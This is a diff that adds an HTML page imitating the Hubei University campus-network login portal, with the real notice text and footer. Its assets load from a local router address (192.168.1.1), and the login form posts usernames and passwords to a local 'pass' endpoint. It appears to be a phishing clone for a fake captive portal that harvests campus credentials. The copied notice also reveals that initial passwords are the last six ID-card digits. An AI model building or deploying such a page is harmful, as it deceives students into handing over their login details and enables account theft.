@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <link type="images/x-icon" rel="shortcut icon" href="http://202.114.144.21/static/img/favicon.ico">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="renderer" content="webkit">
+    <title>湖北大学认证计费系统</title>
+	
+<link rel="stylesheet" type="text/css" href="http://192.168.1.1/bootstrap.css" media="screen">
+
+
+
+
+
+<!--[if lte IE 6]>
+
+<link rel="stylesheet" type="text/css" href="/static/bootstrap/css/bootstrap-ie6.min.css">
+
+
+<link rel="stylesheet" type="text/css" href="/static/bootstrap/css/ie.css">
+<![endif]-->
+
+<link rel="stylesheet" type="text/css" href="http://192.168.1.1/main.css">
+
+
+
+
+<script type="text/javascript" src="http://192.168.1.1/json2.js"></script>
+
+<script type="text/javascript" src="http://192.168.1.1/jquery-1.7.2.min.js"></script>
+
+<script type="text/javascript" src="http://192.168.1.1/hashes.min.js"></script>
+
+<script type="text/javascript" src="http://192.168.1.1/jquery.validate.min.js"></script>
+
+
+<!--[if lte IE 6]>
+
+<script type="text/javascript" src="/static/bootstrap/js/bootstrap-ie.js"></script>
+<![endif]-->
+<script type="text/javascript" src="http://192.168.1.1/jquery.cookie.js"></script>
+<script type="text/javascript" src="http://192.168.1.1/error.js"></script>
+<script type="text/javascript" src="http://192.168.1.1/define.js"></script>
+<script type="text/javascript" src="http://192.168.1.1/main.js"></script>
+</head>
+<body onresize="viewResize()" style="background-size: 1536px 703px;"> 
+<img src="background.jpg" style="width: 100%;position: fixed;">
+<div id="wrap" style="position:relative;">
+	<div class="navbar navbar-default">
+    <div class="navbar-trans">
+        <div class="row-fluid row-no-padding">
+            <div class="span9 offset2">
+                <img data-src="holder.js/260x120" alt="260x120" src="logo.png" id="logo">
+            </div>
+        </div>
+    </div>
+</div>
+	<div class="row-fluid row-no-padding">
+	<div id="error" class="row-error"></div>
+</div>
+<div class="container-fluid">
+	<div class="row-fluid">
+		<div class="span12"></div>
+	    <div class="span5">
+	    <div class="notice" id="notice">
+                                <h2 class="notice-heading">通知:</h2>
+                        <p><br></p><ul class=" list-paddingleft-2" style="list-style-type: disc;"><li><p>原校园网用户（还未转至新网）：账号为学号，现有密码不变；</p></li><li><p>已办理新网开户或迁转用户：账号为学号，初始密码为身份证后6位（有字母则划掉）</p></li><li><p dir="ltr" style="text-indent: 0em;"><span style="font-size: 16px; font-family: arial, helvetica, sans-serif;">如需修改上网帐号密码，请登录自服务平台</span><a href="http://202.114.144.8:8900/" target="_blank" title="title" style="text-decoration: underline; font-size: 16px; font-family: arial, helvetica, sans-serif;"><span style="font-size: 16px; font-family: arial, helvetica, sans-serif;">http://202.114.144.8:8900</span></a></p></li><li><p dir="ltr" style="text-indent: 0em;"><span style="font-size: 16px; font-family: arial, helvetica, sans-serif;">缴费用户，无线请连接HUBU-STUDENT</span></p><p dir="ltr" style="text-indent: 0em;"><span style="font-size: 16px; font-family: arial, helvetica, sans-serif;">未缴费用户，无线请连接HUBU-WLAN</span></p></li><li><p dir="ltr" style="text-indent: 0em;"><span style="font-size: 16px; font-family: arial, helvetica, sans-serif;">学生在宿舍区允许一个手机和一台电脑登录，为保证您的帐号安全，请勿外泄个人帐号信息。</span></p></li></ul><p style="display:none;" data-background="background-repeat:no-repeat; background-position:center center; background-color:#B7DDE8;"><br></p></div>
+	    </div>
+	    <div class="span1">
+	    	<img src="middle.png" class="middle">
+	    </div>
+	    <div class="span5">
+		    <form class="form-signin" id="login-form" novalidate="novalidate" action="pass">
+		        <h2 class="form-signin-heading">湖北大学</h2>
+		        <h2 class="form-signin-heading">校园网认证系统</h2>
+		        	
+		        <div class="control-group">
+					<div class="controls">
+					    <img src="uname.png" class="mg">
+						<input type="text" name="user" class="input-block-level" placeholder="输入账号/用户名">
+				  	</div>
+				</div>
+				<div class="control-group">
+					<div class="controls">
+					    <img src="upwd.png" class="mg">
+						<input type="password" name="pass" class="input-block-level" placeholder="请输入密码">
+				  	</div>
+				</div>
+		        <div class="row-fluid row-no-padding">
+		        	<div class="span4">
+			        	<button class="btn btn-block btn-primary" type="submit" >登录</button>
+			        </div>
+			        <div class="span4">
+			        	<button class="btn btn-block btn-danger" type="submit">注销</button>
+			        </div>
+			        <div class="span4">
+			        	<button class="btn btn-block btn-success" type="submit">自服务</button>
+			        </div>
+			    </div>
+		    </form>
+		    
+		    	
+		    	
+		    	
+		  
+		    <div class="row-fluid row-margin" id="row">
+		    
+		    地址:湖北省武汉市武昌区友谊大道368号 
+			<br>
+			邮政编码:430062 鄂ICP备05003305
+		    </div>
+
+
+	    </div>
+  	</div>
+</div>
+
+</div>
+<div style="display:none;">SRunPortalSvr V1.01 B20180315</div>
+
+
+<script type="text/javascript" src="http://192.168.1.1/pcauth.js"></script>
+
+</body></html>
